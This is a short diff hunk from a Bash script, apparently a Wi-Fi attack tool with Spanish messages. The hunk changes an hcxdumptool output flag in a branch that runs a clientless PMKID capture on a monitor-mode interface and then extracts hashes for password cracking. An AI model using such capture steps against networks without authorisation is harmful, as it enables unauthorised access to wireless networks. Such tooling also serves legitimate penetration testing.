@@ -179,7 +179,7 @@ function startAttack(){
         elif [ "$(echo $attack_mode)" == "PKMID" ]; then
                 clear; echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando ClientLess PKMID Attack...${endColour}\n"
                 sleep 2
-                timeout 2400 bash -c "hcxdumptool -i ${networkCard}mon -w Captura"
+                timeout 2400 bash -c "hcxdumptool -i ${networkCard}mon -o Captura"
                 echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Obteniendo Hashes...${endColour}\n"
                 sleep 2
                 #hcxpcaptool -z myHashes Captura; rm Captura 2>/dev/null
